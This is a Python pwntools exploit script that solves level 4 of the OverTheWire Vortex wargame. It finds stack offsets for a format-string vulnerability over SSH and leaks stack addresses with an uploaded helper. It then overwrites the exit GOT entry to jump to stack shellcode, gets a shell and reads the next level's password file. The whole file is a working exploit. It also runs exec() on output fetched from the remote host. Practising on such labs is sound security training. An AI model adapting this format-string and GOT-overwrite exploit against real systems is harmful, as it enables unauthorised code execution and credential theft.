#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *
from libformatstr import FormatStr
#from funcy import silent

context(arch='i386',os='linux',timeout=2)

level    = 4
host     = 'vortex.labs.overthewire.org'
user     = 'vortex%i' % level
chal     = 'vortex%i' % level
password  = args['PASSWORD']
passfile = '/etc/vortex_pass/vortex%i' % (level+1)
binary   = '/vortex/%s' % chal
shell    = ssh(host=host, user=user, password=password)

# Download the binary for loading ELF information
if not os.path.exists(chal):
    shell.download_file(binary)
    os.chmod(chal, 0755)

#
# Upload our Python sript for executing with a controlled
# environment and argc==0.
#
shell.set_working_directory()
shell.upload_file('exec.py')

#
# Helper routine to execute the above script,
# with ASLR disabled, and get the output.
#
def execute_with_env(format, padding, binary=binary):
    cmd = "python exec.py $%(format)r %(padding)r %(binary)r"
    return shell.run(cmd % locals())

#
# Manually discover the offset of the argument we're looking for
#
# Dump the stack, until our format string is properly
# aligned on a 4-byte boundary.  Use '%x' to dump the
# stack to see this, and adjust the alignment with the
# environment variable that follows our format string.
#
offset     = 0
padding    = -1
stack_dump = '%4x\n'*0x100
result     = ''
XXXX       = enhex('XXXX')
while not offset:
    padding += 1
    result   = execute_with_env(stack_dump, padding).recvall()
    lines    = result.splitlines()

    if XXXX in lines:
        offset = lines.index(XXXX)

log.info("Need padding: %s" % padding)
log.info("Found offset: %s" % offset)

# We can execute on the stack.
# In order to do that, we need to know where on the stack our
# buffer is in absolute terms.
#
# A small helper program is uploaded and compiled, which prints
# out relevant addresses.
shell.upload_file('leak.c')
shell.gcc('-m32 leak.c -o leak')

result = execute_with_env(stack_dump, padding, './leak').recvall().strip()
log.info("Stack leaker says:\n%s" % result)
exec(result) # creates 'sc'


# Adjust the offset to account for arg0 being the format
# string, and the 'XXXX' that we want to skip over.
# And then one more for good measure, which I don't understand.
offset += 2

# Now that we know the offsets on the stack, we can generate
# our format string exploit.
#
# Note that start_len=2 because of 'c=' that is printed.
e = ELF(chal)
f = FormatStr()
f[e.got['exit']]=sc

payload = f.payload(offset, start_len= len('c=XXXX'))
payload += cyclic(len(stack_dump) - len(payload))

log.info("Payload created, sending exploit")

remote = execute_with_env(payload, padding)
remote.clean(2)

remote.sendline('id')
log.success(remote.recv().strip())
remote.sendline('cat %s' % passfile)
password = remote.recv().strip()
log.success('Password: %s' % password)

print password
